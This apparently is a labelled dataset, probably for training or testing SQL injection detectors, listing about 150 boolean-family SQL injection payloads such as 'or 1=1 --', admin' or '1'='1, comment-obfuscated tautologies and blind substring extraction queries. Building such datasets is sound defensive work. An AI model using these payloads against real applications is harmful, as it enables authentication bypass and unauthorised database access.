label,payload,family
attack,select * from users where id  =  1 +$+ or 1  =  1 -- 1,boolean
attack,? or 1  =  1 --,boolean
attack, )   or   (  'a'  =  'a,boolean
attack,admin' or 1  =  1#,boolean
attack," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",boolean
attack,or 1  =  1 --,boolean
attack,select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1',boolean
attack,"1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116",boolean
attack,select * from users where id  =  1 or \.<\ or 1  =  1 -- 1,boolean
attack,"admin"" or ""1""  =  ""1""--",boolean
attack," select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or 1#""?  =  1 or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1",boolean
attack,"or 1  =  1 or """"  =  ",boolean
attack,/**/or/**/1/**/  =  /**/1,boolean
attack," select * from users where id  =  1 or "".  (  "" or 1  =  1 -- 1",boolean
attack,or 1  =  1/*,boolean
attack,%27 or 1  =  1,boolean
attack,select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,boolean
attack,select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1',boolean
attack," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or "".@"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""$["" or 1  =  1 -- 1",boolean
attack,or 1 --',boolean
attack,"admin"" or 1  =  1#",boolean
attack,or 1  =  1--,boolean
attack," select * from users where id  =  1 or "",#"" or 1  =  1 -- 1",boolean
attack,admin'  )   or   (  '1'  =  '1'/*,boolean
attack,or 2 between 1 and 3,boolean
attack," select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",boolean
attack,admin' or '1'  =  '1,boolean
attack,""" or 0  =  0 --",boolean
attack,select * from users where id  =  1 <@.$ or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or ""%."" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1",boolean
attack,"or 0  =  0 #""",boolean
attack," select * from users where id  =  1 or "".]"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or 1#""? or 1  =  1 -- 1",boolean
attack,"""a"""" or 1  =  1--""",boolean
attack,1 and user_name  (    )     =   'dbo',boolean
attack,select * from users where id  =  '1' *$ . or 1  =  1 -- 1',boolean
attack,select * from users where id  =  1 +$+. or 1  =  1 -- 1,boolean
attack,select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,boolean
attack,or 1  =  1 or ''  =  ',boolean
attack,select * from users where id  =  1   or 1  =  1 -- 1,boolean
attack,or 'text' > 't',boolean
attack," select * from users where id  =  1 or ""%["" or 1  =  1 -- 1",boolean
attack,admin' or '1'  =  '1'#,boolean
attack,select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1",boolean
attack,or 'unusual'   =   'unusual',boolean
attack, or 1 in   (  select @@version  )  --,boolean
attack, or 3  =  3 --,boolean
attack,"admin""  )   or   (  ""1""  =  ""1",boolean
attack,select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,boolean
attack,select * from users where id  =  1 %!<@ or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",boolean
attack,"hi' or 'x'  =  'x',",boolean
attack,select * from users where id  =  1 <@ or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or "",{"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1",boolean
attack,"or username like char  (  37  )  ,",boolean
attack,select * from users where id  =  1 or $+<\ or 1  =  1 -- 1,boolean
attack,or 3  =  3,boolean
attack," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",boolean
attack,select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,boolean
attack,select * from users where id  =  1 or \<$ or 1  =  1 -- 1,boolean
attack,admin' or 1  =  1/*,boolean
attack,and 1 in   (  select var from temp  )  --,boolean
attack,hi'  )   or   (  'a'  =  'a,boolean
attack,"admin"" or 1  =  1",boolean
attack," select * from users where id  =  1 or ""{."" or 1  =  1 -- 1",boolean
attack,select * from users where id  =  1.<@. or 1  =  1 -- 1,boolean
attack,"admin""  )   or   (  ""1""  =  ""1""--",boolean
attack,select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or "";1"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""%&"" or 1  =  1 -- 1",boolean
attack,1 and 1  =  1,boolean
attack,or 0  =  0 #,boolean
attack,admin'  )   or '1'  =  '1'--,boolean
attack,"x' and 1  =    (  select count  (  *  )   from tabname  )  , --",boolean
attack," select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1",boolean
attack,select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',boolean
attack," select * from users where id  =  1 or "".%"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1",boolean
attack,select * from users where id  =  '1' <@.$ or 1  =  1 -- 1',boolean
attack,admin'  )   or '1'  =  '1'#,boolean
attack,or '7659'  =  '7659,boolean
attack," select * from users where id  =  1 or ""{@"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",boolean
attack,""" or true--",boolean
attack,select * from users where id  =  1. or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or "";@"" or 1  =  1 -- 1",boolean
attack,â or 3  =  3 --,boolean
attack," select * from users where id  =  1 or "",,""  =  1 or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""  )  1"" or 1  =  1 -- 1",boolean
attack, or uid like '%,boolean
attack,select * from users where id  =  '1' <@&1 or 1  =  1 -- 1',boolean
attack," select * from users where id  =  1 or ""{  (  ""  =  1 or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""%_"" or 1  =  1 -- 1",boolean
attack,select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,boolean
attack,0 or 1  =  1,boolean
attack,"admin""  )   or ""1""  =  ""1",boolean
attack,select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1,boolean
attack,select * from users where id  =  1 + $+%$ or 1  =  1 -- 1,boolean
attack,select * from users where id  =  '1' + $+%\ or 1  =  1 -- 1',boolean
attack,"hi or 1  =  1 --""",boolean
attack,select * from users where id  =  1 or \<\. or 1  =  1 -- 1,boolean
attack,Ã½ or 1  =  1 --,boolean
attack, or 1  =  1 /*,boolean
attack,select * from users where id  =  1 *1 or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or @#"";  =  1 or 1  =  1 -- 1",boolean
attack,‘ or 1  =  1 --,boolean
attack,select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,boolean
attack,or 'a'  =  'a,boolean
attack,select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or ""1]"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""$?"" or 1  =  1 -- 1",boolean
attack,or x  =  x,boolean
attack,or '1'  =  '1,boolean
attack,   )    )    or    (    (   'x'   )    )     =     (    (   'x,boolean
attack,select * from users where id  =  1 <@<@ or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",boolean
attack,a' or 1  =  1--,boolean
attack, )   or   (  a  =  a,boolean
attack,"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",boolean
attack," select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",boolean
attack,admin' or 1  =  1,boolean
attack," select * from users where id  =  1 or "";,""  =  1 or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""  )  ,"" or 1  =  1 -- 1",boolean
attack,‘ or 3  =  3 --,boolean
attack," select * from users where id  =  1 or ""$#"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",boolean
attack, or 1  =  1 --,boolean
attack,1' and non_existant_table   =   '1,boolean
attack," select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",boolean
attack,"x' AND userid IS NULL, --",boolean
attack,select * from users where id  =  1 +   (  \+  )   or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or "".["" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""  (  ["" or 1  =  1 -- 1",boolean
attack,select * from users where id  =  1 or \<1 or 1  =  1 -- 1,boolean
attack,x' or full_name like '%bob%,boolean
attack,"x' and members.email is NULL, --",boolean
attack, or 2 > 1,boolean
attack,select * from users where id  =  1.*1 or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or ""@  )  "" or 1  =  1 -- 1",boolean
attack,select * from users where id  =  1 or \.<$ or 1  =  1 -- 1,boolean
attack,select * from users where id  =  1 + $+%\ or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1",boolean
attack,anything' OR 'x'  =  'x,boolean
attack,a' or 3  =  3--,boolean
